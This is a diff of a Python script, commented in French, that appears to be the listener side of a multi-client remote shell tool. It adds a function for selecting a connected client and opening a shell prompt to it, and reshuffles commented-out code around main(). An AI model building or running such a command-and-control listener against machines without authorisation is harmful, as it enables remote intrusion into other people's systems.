@@ -85,6 +85,19 @@ def list_connection():
             continue
         result += str(i) + '   ' + str(addresses[i][0]) + ':' + str(addresses[i][1]) + '\n'
     print("###### List of Clients ######" + "\n" + result)
+
+# Selectionner un client dans la liste
+def get_trgt(cmd):
+    try:
+        target = cmd.replace('select ', '') #récupérer la valeur de l'index
+        target = int(target) # la mettre au format int
+        conn = connections[target]
+        print("You are now connected to " + str(addresses[target][0]))
+        print("Shell (" + str(addresses[target][0]) + ")>", end="")  #On montre qu'on est sur un nouveau "shell"
+        return conn
+    except:  #Si la selection n'est pas bonne
+        print("Selection is not in the list ... ")
+        return None  #None car il faut retourner qqchose
 """
 # Version Précédente !
 def send_commands(conn):
@@ -98,6 +111,7 @@ def send_commands(conn):
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024), "utf-8") #1024 pour le buffer et encodage utf-8 pour la lisibilité car on utilise bytes et string
             print(client_response, end="")
+"""
 
 def main(): #creation d'une fonction qui contient chaque étape (sauf l'envoie de commandes car il se fait déjà dans la fonction accept_socket()
     socket_creation()
@@ -105,5 +119,4 @@ def main(): #creation d'une fonction qui contient chaque étape (sauf l'envoie d
     accept_socket()
 
 main() #Appel de la fonction principale
-"""
 
